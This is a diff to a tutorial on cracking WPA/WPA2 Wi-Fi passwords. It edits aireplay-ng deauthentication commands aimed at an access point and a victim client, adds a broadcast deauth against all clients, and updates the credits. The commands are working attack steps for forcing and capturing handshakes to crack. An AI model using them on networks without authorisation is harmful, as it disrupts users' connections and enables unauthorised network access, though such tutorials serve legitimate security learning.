@@ -194,11 +194,19 @@ Use `airodump-ng` to monitor a specific access point (using `-c channel --bssid 
 Now, leave `airodump-ng` running and open a new terminal. We will use the `aireplay-ng` command to send fake deauth packets to our victim client, forcing it to reconnect to the network and hopefully grabbing a handshake in the process.
 
 ```bash
-# -0 10 specifies we would like to send 10 deauth packets
+# -0 2 specifies we would like to send 2 deauth packets. Increase this number
+# if need be with the risk of noticably interrupting client network activity
 # -a is the MAC of the access point
 # -c is the MAC of the client
-aireplay-ng -0 10 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
 ```
+
+You can optionally broadcast deauth packets to all connected clients with:
+
+```
+# not all clients respect broadcast deaths though
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0
+``` 
 
 Once you've sent the deauth packets, head back over to your `airodump-ng` process, and with any luck you should now see something like this at the top right: `[ WPA handshake: 9C:5C:8E:C9:AB:C0`. Now that you've captured a handshake you should be ready to [crack the network password](#cracking-the-network-password).
 
@@ -217,7 +225,7 @@ airodump-ng mon0
 airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0
 
 # optionally deauth a connected client to force a handshake
-aireplay-ng -0 10 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
+aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0
 
 ########## crack password with aircrack-ng... ##########
 
@@ -240,4 +248,4 @@ HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
 
 Much of the information presented here was gleaned from [Lewis Encarnacion's awesome tutorial](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html). Thanks also to the awesome authors and maintainers who work on Aircrack-ng and Hashcat. 
 
-Shout out to [DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore), [hivie7510](https://www.reddit.com/user/hivie7510), [hartzell](https://github.com/hartzell), [flennic](https://github.com/flennic), [bhusang](https://github.com/bhusang), and [Shark0der](https://github.com/shark0der) who also provided suggestions and typo fixes on [Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/) and GitHub. If you are interested in hearing some great proposed alternatives to WPA2, check out some of the great discussion on [this](https://news.ycombinator.com/item?id=14840539) Hacker News post.
+Shout out to [DrinkMoreCodeMore](https://www.reddit.com/user/DrinkMoreCodeMore), [hivie7510](https://www.reddit.com/user/hivie7510), [cprogrammer1994](https://github.com/cprogrammer1994), [hartzell](https://github.com/hartzell), [flennic](https://github.com/flennic), [bhusang](https://github.com/bhusang), [tversteeg](https://github.com/tversteeg), [gpetrousov](https://github.com/gpetrousov), [crowchirp](https://github.com/crowchirp) and [Shark0der](https://github.com/shark0der) who also provided suggestions and typo fixes on [Reddit](https://www.reddit.com/r/hacking/comments/6p50is/crack_wpawpa2_wifi_routers_with_aircrackng_and/) and GitHub. If you are interested in hearing some proposed alternatives to WPA2, check out some of the great discussion on [this](https://news.ycombinator.com/item?id=14840539) Hacker News post.
